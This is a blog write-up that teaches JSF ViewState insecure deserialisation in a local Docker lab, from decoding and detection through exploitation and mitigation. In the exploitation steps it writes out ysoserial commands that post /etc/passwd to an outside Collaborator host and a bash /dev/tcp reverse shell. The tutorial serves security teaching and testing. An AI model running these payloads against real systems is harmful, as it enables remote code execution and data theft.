---
layout: post
title: Demystifying Insecure Deserialisation on JSF Application
date: 2021-05-08
summary: JSF Viewstate Deserialisation
categories: Web Security
tags: [Bugs, Write-Ups, Web Security]
---

Hi Everyone,

I'm back with an another blog on interesting vulnerability **Insecure Deserialisation on JSF Applications** which occurs due to the **Misconfigured Viewstate**

<p align="center">
  <img src="/images/deserialisation/desc1.png">
</p>

<p align="center"> <strong>Difference between Serialization & Deserialization:</strong></p>

* **Serialization** is the process of taking an object and translating it into plaintext. This plaintext can then be encrypted or signed, as well as simply used the way it is.

* The **reverse** process is called **Deserialization**, i.e. when the plaintext is converted back to an object.

<p align="center">
  <img src="/images/deserialisation/desc2.png">
</p>

<p align="center"> <strong>ViewState</strong></p>

* The purpose of “ViewState” is to memorize the state of the user, even after numerous HTTP queries (stateless protocol).
* Different Types of View-state
  1. .Net - ``___Viewstate``
  2. JSF - ``javax.faces.Viewstate``    

<p align="center"> <strong>Flow of JSF ViewState</strong></p>

* The "ViewState" of a page is by default, stored in a hidden form field in the web page named **javax.faces.ViewState**.
* ViewState starts with **H4sIAAAA**, which represent the Base64Gzip.

<p align="center">
  <img src="/images/deserialisation/desc3.png">
</p>

<p align="center">
  <img src="/images/deserialisation/desc4.png">
</p>

<p align="center"> <strong>Layers in JSF Viewstate</strong></p>

<p align="center">
  <img src="/images/deserialisation/desc5.png">
</p>

<p align="center"><strong>Environment Setup</strong></p>

Step 1: Create a Docker Compose file using the following command 

`docker-compose.yml`

```bash
version: '2'
services:
  web:
    image: vulhub/mojarra:2.1.28
    ports:
      - "8080:8080"
```

Step 2: Execute the following command to start a JSF application which using JDK7u21 and Mojarra 2.1.28

```bash
docker-compose up -d
```
<p align="center">
  <img src="/images/deserialisation/desc6.png">
</p>

Step 3: After the application is started, visit http://127.0.0.1:8080 to see the demo page.

<p align="center">
  <img src="/images/deserialisation/desc7.png">
</p>

<p align="center"><strong>Decoding JSF Viewstate</strong></p>

Step 1: Open the Demo URL http://127.0.0.1:8080 , give a sample input and intercept the request using Client-Side Proxy such as Burpsuite as shown below.

<p align="center">
  <img src="/images/deserialisation/desc8.png">
</p>

Step 2: In the request body, it can be observed that the application uses JSF Viewstate format.

<p align="center">
  <img src="/images/deserialisation/desc9.png">
</p>

Step 3: Select the **javax.faces.ViewState** values , right click & send it to **Decoder** as shown below.

<p align="center">
  <img src="/images/deserialisation/desc10.png">
</p>

Step 4: First do a **URL Decode** -> **Base64 Decode** -> **GZip Decode**.

<p align="center">
  <img src="/images/deserialisation/desc11.png">
</p>

Step 5: The final output gives some information about the java utils and components used in the application.

<p align="center">
  <img src="/images/deserialisation/desc12.png">
</p>

<p align="center"><strong>Burpsuite Extenders & Tools Configuration</strong></p>

* Install **Java Deserialization Scanner** from **Extenders** -> **BApp Store**.

<p align="center">
  <img src="/images/deserialisation/desc13.png">
</p>

* Navigate to the **Deserialization Scanner** -> **Configurations** and configure the ysoserial.

<p align="center">
  <img src="/images/deserialisation/desc14.png">
</p>

Note: ysoserial can be downloaded from <https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar>

* We need to find the payload type in-order to use the ysoserial tool.

<p align="center"><strong>Vulnerability Detection</strong></p>

Step 1: Intercept the request of the application and send the request to **DS - Manual Testing** .

<p align="center">
  <img src="/images/deserialisation/desc15.png">
</p>

Step 2: Select the **javax.faces.ViewState** values and **Set Insertion Point**.

<p align="center">
  <img src="/images/deserialisation/desc16.png">
</p>

Step 3: Choose Attack (Base64GZip) as shown below.

<p align="center">
  <img src="/images/deserialisation/desc17.png">
</p>

Step 4: If the viewstate is vulnerable, it will show **Potentially VULNERABLE!!!**.

<p align="center">
  <img src="/images/deserialisation/desc18.png">
</p>

Step 5: Now we got the payload type which is **Jdk7u21** 

<p align="center"><strong>Exploitation Phase</strong></p>

NOTE: There are two ways to Exploit a JSF Viewstate Deserialisation

* Out-Of-Band 
* Reverse Shell

<p align="center"><strong>Exploitation using Deserialization Scanner</strong></p>

Step 1: Send the vulnerable request to **DS - Exploitation Tab**

Step 2: Using the following command to perform a **OOB Deserialisation** and Read Internal Files of the application

```bash
Jdk7u21 "wget --post-file /etc/passwd  http://xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.burpcollaborator.net"
```

<p align="center">
  <img src="/images/deserialisation/desc19.png">
</p>

<p align="center">
  <img src="/images/deserialisation/desc20.png">
</p>

<p align="center"><strong>Manual Payload Creation using Ysoserial</strong></p>

**Ysoserial Syntax** 

```bash
java -jar ysoserial-[version]-all.jar [payload] '[command]'
```
**Payload Command**

```bash
java -jar ysoserial-master-SNAPSHOT.jar Jdk7u21 "wget --post-file /etc/passwd  http://xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.burpcollaborator.net" | gzip | base64 -w 0
```
 
<p align="center">
  <img src="/images/deserialisation/descc21.png">
</p>

* Replace the **javax.faces.ViewState** value with the Ysoserial generated payload and **URL Encode** it.

<p align="center">
  <img src="/images/deserialisation/descc22.png">
</p>

* Click on Go and Observe the response in Burp Collaborator.

<p align="center">
  <img src="/images/deserialisation/desc23.png">
</p>

<p align="center"><strong>Establishing a Stable Reverse Shell</strong></p>

Step 1: Send the vulnerable request to **DS - Exploitation Tab**

Step 2: Use the following Bash Reverse Shell command to gain a **Reverse Shell**.

```bash
Jdk7u21 "/bin/bash -c /bin/bash${IFS}-i>&/dev/tcp/ipaddress/1337<&1"
```
* bash -i >& - Invokes bash with an **“interactive”** option.
* /dev/tcp/ipaddress/1337 - Redirects that session to a tcp socket via device file. 
* 0>&1 - Takes standard output, and connects it to standard input.

<p align="center">
  <img src="/images/deserialisation/descc24.png">
</p>

<p align="center">
  <img src="/images/deserialisation/descc25.png">
</p>

<p align="center"> Now we have reached stable Reverse Shell using JSF Viewstate Deserialisation.</p>

<p align="center">
  <img src="https://media.giphy.com/media/l0D76LT6o1jaG2g0M/source.gif">
</p>

**Mitigation :**
* Always validate the scope of Java objects. It is not recommended to use the scope @ViewScoped, because it is often the source of information leaks.
* Use the keyword transient on attributes you do not want to store in the ViewState. It will prevent their serialization.
* Always encrypt the ViewState and use an integrity check mechanism if the implementation supports it.
* Never trust the data contained in a ViewState. Consider they have been potentially tampered by a user. So, you must check them carefully to prevent the attacks previously described.

**Reference :**
<p><a href="https://www.exploit-db.com/docs/48126">Java Deserialization in ViewState</a>
<p><a href="https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html">Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities</a>
<p><a href="https://www.synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf">JSF ViewState upside-down</a>

<p align="center">
  <img src="https://media.giphy.com/media/d7IaKUMk8RqtFjT71B/source.gif">
</p>

Thanks a lot for reading :)
